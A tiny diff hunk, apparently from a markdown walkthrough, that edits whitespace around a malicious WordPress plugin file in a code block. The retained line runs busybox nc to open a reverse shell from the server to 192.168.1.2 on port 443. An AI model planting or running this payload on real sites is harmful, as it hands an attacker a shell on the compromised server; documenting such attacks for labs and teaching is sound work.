@@ -458,9 +458,7 @@ nano plugin.php
   * Author: d4t4s3c
   * Author URI: https://github.com/d4t4s3c
   */
-
   exec("busybox nc 192.168.1.2 443 -e /bin/sh");
-
 ?>
 ```
 
